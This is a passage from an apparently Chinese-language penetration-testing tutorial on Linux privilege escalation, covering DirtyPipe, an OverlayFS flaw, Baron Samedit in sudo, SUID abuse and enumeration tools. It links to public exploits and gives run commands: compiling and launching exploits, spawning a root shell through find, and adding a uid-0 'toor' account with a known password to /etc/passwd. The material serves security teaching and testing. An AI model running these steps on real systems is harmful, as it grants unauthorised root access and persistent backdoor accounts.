+<p><strong><font style="color:#DF2A3F;">EXP下载地址：</font></strong><a class="link" href="https://github.com/nomi-sec/PoC-in-GitHub/blob/master/2022/CVE-2022-0847.json"  target="_blank" rel="noopener"
+    >https://github.com/nomi-sec/PoC-in-GitHub/blob/master/2022/CVE-2022-0847.json</a></p>
+<p><font style="color:#DF2A3F;">exp：</font><a class="link" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/"  target="_blank" rel="noopener"
+    ><font style="color:#DF2A3F;">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/</font></a></p>
+<p><font style="color:#DF2A3F;">exp：</font><a class="link" href="https://github.com/r1is/CVE-2022-0847"  target="_blank" rel="noopener"
+    ><font style="color:#DF2A3F;">https://github.com/r1is/CVE-2022-0847</font></a></p>
+<p><a class="link" href="https://www.freebuf.com/articles/network/324606.html"  target="_blank" rel="noopener"
+    >405</a></p>
+<p><a class="link" href="https://www.freebuf.com/vuls/331378.html"  target="_blank" rel="noopener"
+    >405</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">漏洞利用</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//haxx.in/files/dirtypipez.c</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">exp</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="n">2022</span><span class="o">-</span><span class="n">0847</span><span class="p">.</span><span class="na">c</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">exp</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">su</span><span class="w">  </span><span class="c1">//任何具有suid</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">gcc</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">exp</span><span class="w">   </span><span class="n">编译exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">su</span><span class="w"> </span><span class="n">root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">密码aaron</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mv</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">passwd</span><span class="p">.</span><span class="na">bak</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">               </span><span class="n">还原password文件</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="215cve-2023-0386">2.1.5.CVE-2023-0386
+</h3><p><strong>该漏洞存在于Linux内核的OverlayFS子系统中，是一个权限提升漏洞。当用户将一个具有权限的文件从一个nosuid挂载点复制到另一个挂载点时，未经授权的本地用户可以执行 setuid文件，导致权限提升。</strong></p>
+<p><strong><font style="color:#DF2A3F;">漏洞产品: linux kernel - overlay文件系统</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">影响范围: Linux:Kernel v5.11-rc1 - v6.2-rc5](Linux:Kernel v5.11-rc1 - v6.2-rc5)</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">漏洞利用exp：</font></strong>[<strong>https://github.com/chenaotian/CVE-2023-0386(</strong>](<a class="link" href="https://github.com/chenaotian/CVE-2023-0386%28%29"  target="_blank" rel="noopener"
+    >https://github.com/chenaotian/CVE-2023-0386()</a><strong><font style="color:#DF2A3F;">主要针对于ubuntu操作系统)</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">Wall</span><span class="w"> </span><span class="n">exp</span><span class="p">.</span><span class="na">c</span><span class="w"> </span><span class="err">`</span><span class="n">pkg</span><span class="o">-</span><span class="n">config</span><span class="w"> </span><span class="n">fuse</span><span class="w"> </span><span class="o">--</span><span class="n">cflags</span><span class="w"> </span><span class="o">--</span><span class="n">libs</span><span class="err">`</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">exp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">exp</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞复现exp2：<a class="link" href="https://github.com/xkaneiki/CVE-2023-0386"  target="_blank" rel="noopener"
+    >https://github.com/xkaneiki/CVE-2023-0386</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">make</span><span class="w"> </span><span class="n">all</span><span class="w">                </span><span class="n">编译</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">启动两个终端</span><span class="err">，</span><span class="n">在第一个终端中输入</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">fuse</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">ovlcap</span><span class="o">/</span><span class="n">lower</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="n">gc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">在第二个终端输入</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">exp</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="216msf中的内核提权模块">2.1.6.MSF中的内核提权模块
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">run</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/32.png"
+	width="2182"
+	height="987"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/32_hu_b8d4a8df4b61919f.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/32_hu_3de378d59bd494be.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="530px"
+	
+></p>
+<h3 id="217linux权限提升信息收集脚本">2.1.7.Linux权限提升信息收集脚本
+</h3><p><strong>自动化提权：</strong><a class="link" href="https://github.com/liamg/traitor"  target="_blank" rel="noopener"
+    ><strong>https://github.com/liamg/traitor</strong></a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/j62pz1-xCwINmf7qKla95Q"  target="_blank" rel="noopener"
+    >一款自动化提权工具</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">traitor</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w">    </span><span class="c1">//使用-a/--any标志运行以查找潜在漏洞，尝试利用每个漏洞，如果获得 root shell，则停止。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">traitor</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">docker</span><span class="p">:</span><span class="n">writable</span><span class="o">-</span><span class="n">socket</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/33.png"
+	width="1966"
+	height="924"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/33_hu_4aaea3f02f647cbb.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/33_hu_278773217a7f1b14.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">自动化提权</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/AlessandroZ/BeRoot</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">信息收集</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/rebootuser/LinEnum</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/sleventyeleven/linuxprivchecker</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">漏洞探针</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/mzet-/linux-exploit-suggester</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/jondonas/linux-exploit-suggester-2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">二进制文件提权命令查询平台</span><span class="err">：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Linux</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//gtfobins.github.io/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Windows</span><span class="err">：</span><span class="n">https</span><span class="p">:</span><span class="c1">//lolbas-project.github.io</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="22suid提权">2.2.SUID提权
+</h2><p><a class="link" href="https://gtfobins.github.io/"  target="_blank" rel="noopener"
+    >https://gtfobins.github.io/</a></p>
+<p><a class="link" href="https://blog.csdn.net/weixin_43995499/article/details/114270048"  target="_blank" rel="noopener"
+    >Linux提权之suid篇_bash -p-CSDN博客</a></p>
+<p><a class="link" href="https://juejin.cn/post/7163436481401323550"  target="_blank" rel="noopener"
+    >https://juejin.cn/post/7163436481401323550</a></p>
+<p><strong><font style="color:#DF2A3F;">suid可以让文件调用者暂时获得文件拥有者的权限，suid提权的思路让普通用户运行root用户所拥有的suid文件，从而达到提权的目的</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">自己设置某个软件为SUID权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chmod</span><span class="w"> </span><span class="n">u</span><span class="o">+</span><span class="n">s</span><span class="w"> </span><span class="n">filename</span><span class="w">        </span><span class="c1">//设置某个软件具有SUID权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chmod</span><span class="w"> </span><span class="n">u</span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">filename</span><span class="w">        </span><span class="c1">//去除SUID权限</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/34.png"
+	width="1036"
+	height="341"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/34_hu_aa21baafc1ca815e.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/34_hu_f40279a7ff688798.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="303"
+		data-flex-basis="729px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">查找SUID权限文件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">user</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="n">4000</span><span class="w"> </span><span class="o">-</span><span class="n">print</span><span class="w"> </span><span class="n">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="n">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">user</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">perm</span><span class="w"> </span><span class="o">-</span><span class="n">4000</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">ldb</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="err">\</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/35.png"
+	width="1016"
+	height="379"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/35_hu_58e6ac317c3e05d3.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/35_hu_1c54879e0e1508f5.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="643px"
+	
+></p>
+<h3 id="221find-suid提权">2.2.1.find SUID提权
+</h3><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/36.png"
+	width="866"
+	height="532"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/36_hu_477d680bc72924b0.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/36_hu_b79e698e2192c7f1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="390px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">find</span><span class="w"> </span><span class="n">linux</span><span class="o">-</span><span class="n">exploit</span><span class="o">-</span><span class="n">suggester</span><span class="p">.</span><span class="na">sh</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="err">\</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="n">linux</span><span class="o">-</span><span class="n">exploit</span><span class="o">-</span><span class="n">suggester</span><span class="p">.</span><span class="na">sh</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="s">&#34;/bin/bash&#34;</span><span class="w"> </span><span class="err">\</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="n">lsec</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">\</span><span class="p">;</span><span class="w">   </span><span class="c1">//获取root权限交互</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/37.png"
+	width="818"
+	height="180"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/37_hu_e1140717ffb24968.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/37_hu_cd3e7f902fd79e5.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="454"
+		data-flex-basis="1090px"
+	
+></p>
+<p><strong><font style="color:#DF2A3F;">除find外，以下命令具有SUID权限也可以用来提权nmap，vim，bash，more，less，nano，cp</font></strong></p>
+<h3 id=""><strong><font style="color:#DF2A3F;">2.2.2.Vim SUID提权</font></strong>
+</h3><p><strong>利用vim提权的思路是修改etc/passwd文件，为自己添加一个有root权限的用户</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">chmod</span><span class="w"> </span><span class="n">u</span><span class="o">+</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">vim</span><span class="p">.</span><span class="na">basic</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">vim</span><span class="p">.</span><span class="na">basic</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">将toor</span><span class="p">:</span><span class="n">$1$asd$sTMDZlRI6L</span><span class="p">.</span><span class="na">jJEw2I</span><span class="p">.</span><span class="na">3x8</span><span class="p">.:</span><span class="n">0</span><span class="p">:</span><span class="n">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">toor</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash添加到</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd中</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">su</span><span class="w"> </span><span class="n">toor</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">密码123</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="23sudo提权">2.3.Sudo提权
+</h2><p><a class="link" href="https://blog.csdn.net/m0_73726899/article/details/141003493"  target="_blank" rel="noopener"
+    >【Linux】sudo提升权限（入门）-CSDN博客</a></p>
+<p><strong>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区谥出。只要存在sudoers文件（通常是/etc/sudoers)，攻击者就可以使用本地普通用户利用sudo获得系统root权限</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">          </span><span class="c1">//查看当前用户哪些命令可以使用root权限</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/38.png"
+	width="2236"
+	height="459"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/38_hu_d9dea12456cc5e06.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/38_hu_3682cd9598242449.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="487"
+		data-flex-basis="1169px"
+	
+></p>
+<p><strong>将以上列举出可以使用root权限执行的命令去</strong><a class="link" href="https://gtfobins.github.io/gtfobins/at/"  target="_blank" rel="noopener"
+    ><strong>https://gtfobins.github.io/gtfobins/at/</strong></a><strong>这个网站寻找是否存在sudo提权的可能</strong></p>
+<h3 id="231cve-2021-3156sudo提权"><strong>2.3.1.CVE-2021-3156&mdash;</strong><font style="color:rgb(64, 64, 64);">sudo提权</font>
+</h3><p><a class="link" href="https://www.jianshu.com/p/18f36f1342b3"  target="_blank" rel="noopener"
+    >【kernel exploit】CVE-2021-3156 sudo漏洞分析与利用</a></p>
+<p><strong>影响版本：</strong></p>
+<ul>
+<li><strong>1.9.0 &lt;= Sudo &lt;= 1.9.5 p1 所有稳定版（默认配置）</strong></li>
+<li><strong>1.8.2 &lt;= Sudo &lt;= 1.8.31 p2 所有老版本</strong></li>
+<li><strong>最新的系统，如Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), Fedora 33 (Sudo 1.9.2) 都受到影响。</strong></li>
+</ul>
+<p><strong>漏洞描述</strong>：<strong>CVE-2021-3156（该漏洞被命名为“Baron Samedit”）——sudo在处理单个反斜杠结尾的命令时，发生逻辑错误，导致堆溢出。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。漏洞引入时间为2011年7月（commit 8255ed69），漏洞存在时间达10年。</strong></p>
+<p><strong>漏洞检测方法：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">在非root权限下</span><span class="err">，</span><span class="n">运行命令$</span><span class="w"> </span><span class="n">sudoedit</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="err">。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">若出现以sudoedit</span><span class="err">：</span><span class="n">开头的错误响应</span><span class="err">，</span><span class="n">则系统受到此漏洞影响</span><span class="err">；</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">若出现以usage</span><span class="err">：</span><span class="n">开头的错误响应</span><span class="err">，</span><span class="n">则表示该漏洞已被补丁修复</span><span class="err">。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/39.png"
+	width="1492"
+	height="423"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/39_hu_cf194453f4c6fca8.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/39_hu_14cfd80cc33a612c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="352"
+		data-flex-basis="846px"
+	
+></p>
+<p>exp：<a class="link" href="https://github.com/blasty/CVE-2021-3156"  target="_blank" rel="noopener"
+    >https://github.com/blasty/CVE-2021-3156</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">wget</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//github.com/blasty/CVE-2021-3156</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cd</span><span class="w"> </span><span class="n">CVE</span><span class="o">-</span><span class="n">2021</span><span class="o">-</span><span class="n">3156</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">make</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">.</span><span class="o">/</span><span class="n">sudo</span><span class="o">-</span><span class="n">hax</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="n">a</span><span class="o">-</span><span class="n">sandwich</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="232cve-2023-22809">2.3.2.CVE-2023-22809
+</h3><p><a class="link" href="https://cloud.tencent.com/developer/article/2315012"  target="_blank" rel="noopener"
